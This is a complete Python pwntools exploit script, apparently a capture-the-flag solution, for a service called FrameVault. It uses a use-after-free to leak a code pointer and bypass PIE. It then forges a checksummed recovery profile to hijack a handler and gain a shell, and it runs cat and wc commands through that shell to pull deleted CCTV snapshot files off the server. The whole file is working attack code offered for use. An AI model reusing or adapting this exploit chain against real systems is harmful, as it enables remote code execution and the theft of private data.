#!/usr/bin/env python3

import argparse
import hashlib
import os
import re
import shlex
from pathlib import Path

from pwn import context, log, p32, p64, remote, u64


PROMPT = b"framevault> "
JOB_ID = b"JOB-0075"
SEGMENT_ID = 0x09182326
NOTE = b"A" * 24

# Ubuntu 24.04/GCC build from build.sh:
#   operator_recovery             @ PIE + 0x17a2
#   restore_deleted_snapshots     @ PIE + 0x1814
RESTORE_DELTA = 0x1814 - 0x17A2
EXPECTED_OPERATOR_PAGE_OFFSET = 0x7A2

REMOTE_DIR = "/home/ctf/[Deleted]"
SNAPSHOTS = (
    "CAM073-20260918230511-Snapshotd.png",
    "CAM075-20260918231857-Snapshot[CCTV 관리실-3].png",
)


def recovery_checksum(prefix: bytes) -> int:
    """Reproduce recovery_profile_checksum() over profile bytes 0..43."""
    if len(prefix) != 44:
        raise ValueError(f"checksum prefix must be 44 bytes, got {len(prefix)}")

    value = 0x52454356
    for byte in prefix:
        value ^= byte
        value = (value * 0x01000193) & 0xFFFFFFFF
        value = ((value << 5) | (value >> 27)) & 0xFFFFFFFF
    return value ^ 0xA17C9E3B


def make_profile(restore_handler: int) -> bytes:
    profile = b"cold-restore".ljust(16, b"\0")
    profile += b"raw-v1".ljust(8, b"\0")
    profile += p64(restore_handler)
    profile += p64(SEGMENT_ID)
    profile += p32(1)
    profile += p32(recovery_checksum(profile))
    assert len(profile) == 0x30
    return profile


def run_command(io, command: bytes) -> None:
    io.sendlineafter(PROMPT, command)


def get_shell(io) -> int:
    # Allocate RecoveryJob, then leave queued_job pointing at its freed chunk.
    run_command(io, b"job create SEG-09182326")
    run_command(io, b"audit rotate " + JOB_ID)

    # RecoveryNote has the same allocation size. Its untouched final 24 bytes
    # retain RecoveryJob.handler/segment_id/status and are exposed by --raw.
    io.sendlineafter(PROMPT, b"audit note " + JOB_ID)
    io.sendlineafter(b"Note: ", NOTE)
    io.sendlineafter(PROMPT, b"audit show " + JOB_ID + b" --raw")
    io.recvuntil(b"----- BEGIN RAW AUDIT RECORD -----\n")
    raw_note = io.recvn(0x30)

    if len(raw_note) != 0x30 or raw_note[:24] != NOTE:
        raise RuntimeError("failed to obtain the 48-byte raw audit leak")

    operator_recovery = u64(raw_note[24:32])
    if operator_recovery & 0xFFF != EXPECTED_OPERATOR_PAGE_OFFSET:
        raise RuntimeError(
            "unexpected operator_recovery address; remote binary may not match "
            f"the supplied build ({operator_recovery:#x})"
        )

    restore_handler = operator_recovery + RESTORE_DELTA
    pie_base = operator_recovery - 0x17A2
    log.success(f"PIE base: {pie_base:#x}")
    log.success(f"restore_deleted_snapshots: {restore_handler:#x}")

    # apply_profile frees RecoveryNote and immediately allocates a same-sized
    # RecoveryProfile, so queued_job now aliases this fully controlled object.
    profile = make_profile(restore_handler)
    io.sendlineafter(PROMPT, b"profile apply " + JOB_ID)
    io.sendlineafter(b"Profile name: ", b"custom-recovery")
    io.sendlineafter(b"Profile data (96 hex characters): ", profile.hex().encode())
    io.sendlineafter(PROMPT, b"job resume " + JOB_ID)
    io.recvuntil(b"[RECOVERY] Maintenance shell granted.\n")
    log.success("maintenance shell acquired")
    return pie_base


def download_file(io, remote_path: str, output_path: Path, index: int, timeout: float) -> None:
    """Transfer an arbitrary binary file using an exact byte count."""
    token = f"{os.getpid():x}_{index}"
    size_tag = f"__FV_SIZE_{token}__".encode()
    begin_tag = f"__FV_BEGIN_{token}__".encode()
    end_tag = f"__FV_END_{token}__".encode()
    quoted_path = shlex.quote(remote_path).encode()

    io.sendline(b"printf '" + size_tag + b"'; wc -c < " + quoted_path)
    io.recvuntil(size_tag, timeout=timeout)
    size_line = io.recvline(timeout=timeout).strip()
    if not re.fullmatch(rb"[0-9]+", size_line):
        raise RuntimeError(f"could not read remote size for {remote_path!r}: {size_line!r}")
    size = int(size_line)

    io.sendline(
        b"printf '"
        + begin_tag
        + b"'; cat -- "
        + quoted_path
        + b"; printf '"
        + end_tag
        + b"'"
    )
    io.recvuntil(begin_tag, timeout=timeout)
    contents = io.recvn(size, timeout=timeout)
    if len(contents) != size:
        raise RuntimeError(
            f"short read for {remote_path!r}: expected {size}, got {len(contents)}"
        )
    io.recvuntil(end_tag, timeout=timeout)

    if not contents.startswith(b"\x89PNG\r\n\x1a\n"):
        raise RuntimeError(f"downloaded data for {remote_path!r} is not a PNG")

    output_path.parent.mkdir(parents=True, exist_ok=True)
    partial_path = output_path.with_name(output_path.name + ".part")
    partial_path.write_bytes(contents)
    partial_path.replace(output_path)

    digest = hashlib.sha256(contents).hexdigest()
    log.success(f"saved {output_path} ({size} bytes, sha256={digest})")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Exploit FrameVault and recover both deleted CCTV snapshots."
    )
    parser.add_argument("host", nargs="?", default="pwnable.roomescapectf2026.site")
    parser.add_argument("port", nargs="?", type=int, default=40599)
    parser.add_argument("-o", "--output", type=Path, default=Path("recovered"))
    parser.add_argument(
        "--timeout",
        type=float,
        default=240.0,
        help="timeout for each network operation (default: 240 seconds)",
    )
    parser.add_argument(
        "--shell",
        action="store_true",
        help="keep the maintenance shell interactive after downloading",
    )
    parser.add_argument("--debug", action="store_true")
    return parser.parse_args()


def main() -> None:
    cli = parse_args()
    context.arch = "amd64"
    context.log_level = "debug" if cli.debug else "info"
    context.timeout = cli.timeout

    io = remote(cli.host, cli.port)
    try:
        get_shell(io)
        for index, filename in enumerate(SNAPSHOTS):
            download_file(
                io,
                f"{REMOTE_DIR}/{filename}",
                cli.output / filename,
                index,
                cli.timeout,
            )

        if cli.shell:
            io.interactive()
        else:
            io.sendline(b"exit")
    finally:
        io.close()


if __name__ == "__main__":
    main()
